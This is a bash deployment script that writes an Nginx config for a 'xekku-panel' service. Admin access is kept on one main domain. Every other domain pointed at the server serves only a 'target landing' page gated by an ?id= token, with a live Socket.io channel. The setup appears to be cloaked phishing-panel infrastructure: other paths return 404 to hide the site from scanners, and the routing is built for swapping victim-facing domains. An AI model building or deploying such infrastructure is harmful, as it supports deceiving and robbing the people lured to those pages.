#!/bin/bash

# Configure Nginx for domain-specific routing
# Main domain: Admin/user login access
# Connected domains: Target landing pages only

echo "Setting up domain-specific routing..."

# Create new Nginx configuration
cat <<'EOF' > /etc/nginx/sites-available/xekku-panel
# Default server - handle ALL connected domains (targets only)
# This catches any domain pointed to the server that isn't the main domain
server {
    listen 80 default_server;
    server_name _;
    
    # Handle Socket.io for all domains (MUST be first for proper routing)
    location /socket.io/ {
        proxy_pass http://localhost:3001;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
        proxy_buffering off;
    }
    
    # Block admin/login access on all connected domains
    location ~ ^/(admin|login|logout|dashboard) {
        return 404;
    }
    
    # Allow API endpoints needed for target interface
    location /api/ {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }
    
    # Allow static assets (JS, CSS, images) needed for target interface
    location ~ \.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$ {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        expires 1h;
        add_header Cache-Control "public, immutable";
    }
    
    # Root path with id parameter for targets
    location = / {
        # Check if id parameter exists
        if ($arg_id = "") {
            return 404;
        }
        
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }
    
    # Block all other paths
    location / {
        return 404;
    }
}

# HTTP server - main domain (redirect to HTTPS)
server {
    listen 80;
    server_name cbinfodesk.shop;
    return 301 https://$host$request_uri;
}

# HTTPS server - main domain (full admin access)
server {
    listen 443 ssl;
    server_name cbinfodesk.shop;

    # SSL configuration
    ssl_certificate /etc/letsencrypt/live/cbinfodesk.shop/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cbinfodesk.shop/privkey.pem;
    include /etc/letsencrypt/options-ssl-nginx.conf;
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;

    # Allow all paths on main domain
    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }

    location /socket.io/ {
        proxy_pass http://localhost:3001;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }
}
EOF

# Enable the new configuration
rm -f /etc/nginx/sites-enabled/*
ln -s /etc/nginx/sites-available/xekku-panel /etc/nginx/sites-enabled/

# Test the configuration
nginx -t

if [ $? -eq 0 ]; then
    echo "Nginx configuration is valid. Reloading..."
    systemctl reload nginx
    echo "Configuration updated successfully!"
    echo ""
    echo "Domain routing configured:"
    echo "🔐 Admin/Login access: https://cbinfodesk.shop/admin/login"
    echo "🔐 User login access:  https://cbinfodesk.shop/login"
    echo "🎯 Target landing:     http://ANY-DOMAIN/?id=dXNlcg=="
    echo ""
    echo "ANY domain pointed to your server will:"
    echo "✅ Show landing page ONLY with ?id= parameter"
    echo "✅ Handle Socket.io connections for target interface"
    echo "✅ Allow API endpoints for target functionality"
    echo "✅ Allow static assets (JS, CSS, images)"
    echo "❌ Block /admin, /login, /dashboard access"
    echo "❌ Block access without ?id= parameter"
    echo ""
    echo "Only cbinfodesk.shop allows admin access"
    echo ""
    echo "🔧 Debugging tips:"
    echo "1. Test Socket.io: http://any-domain/socket.io/socket.io.js"
    echo "2. Check target page: http://any-domain/?id=dXNlcg=="
    echo "3. Monitor logs: tail -f /var/log/nginx/error.log"
else
    echo "Nginx configuration has errors. Please check the syntax."
    exit 1
fi